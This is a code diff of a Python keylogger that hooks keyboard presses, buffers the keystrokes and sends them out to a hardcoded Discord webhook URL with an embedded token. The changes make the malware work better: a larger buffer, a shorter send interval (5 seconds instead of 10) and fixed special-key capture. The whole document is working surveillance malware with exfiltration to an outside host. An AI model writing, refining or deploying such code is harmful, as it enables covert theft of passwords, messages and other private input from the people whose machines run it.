@@ -6,7 +6,7 @@ import time
 WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1285284225011945472/SX1X6-7wLEme6JdTr31kAs4tYjF_gCRSpxTb1DTXZR4xh0o1U6KvsZTy1aGp1STXhaQk'
 
 key_buffer = []
-BUFFER_SIZE = 50
+BUFFER_SIZE = 100
 lock = threading.Lock()
 
 def send_to_discord(message):
@@ -22,7 +22,7 @@ def send_to_discord(message):
 
 def process_buffer():
     while True:
-        time.sleep(10)
+        time.sleep(5)
         with lock:
             if key_buffer:
                 message = ''.join(key_buffer)
@@ -60,11 +60,11 @@ def on_press(key):
                 keyboard.Key.insert: ' [INSERT]',
                 keyboard.Key.print_screen: ' [PRINT-SCREEN]',
             }
-            special_key = special_keys.get(key)
-        if special_key:
-            key_entry = f'{special_key}'
-        else:
-            return
+            special_key = special_keys.get(key, None)
+            if special_key:
+                key_entry = f'{special_key}'
+            else:
+                return
         
         with lock:
             key_buffer.append(key_entry)
